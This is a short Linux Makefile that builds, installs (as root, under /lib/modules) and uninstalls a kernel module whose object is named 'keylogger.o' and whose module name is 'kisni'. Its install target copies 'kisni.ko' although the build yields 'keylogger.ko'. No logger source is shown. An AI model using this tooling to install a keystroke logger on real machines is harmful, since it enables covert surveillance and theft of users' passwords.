obj-m += keylogger.o

modname := kisni

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


install:
	mkdir -p /lib/modules/$(shell uname -r)/misc/$(modname)
	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(shell uname -r)/misc/$(modname)
	depmod -a

uninstall:
	rm /lib/modules/$(shell uname -r)/misc/$(modname)/$(modname).ko
	rmdir /lib/modules/$(shell uname -r)/misc/$(modname)
	rmdir /lib/modules/$(shell uname -r)/misc
	depmod -a
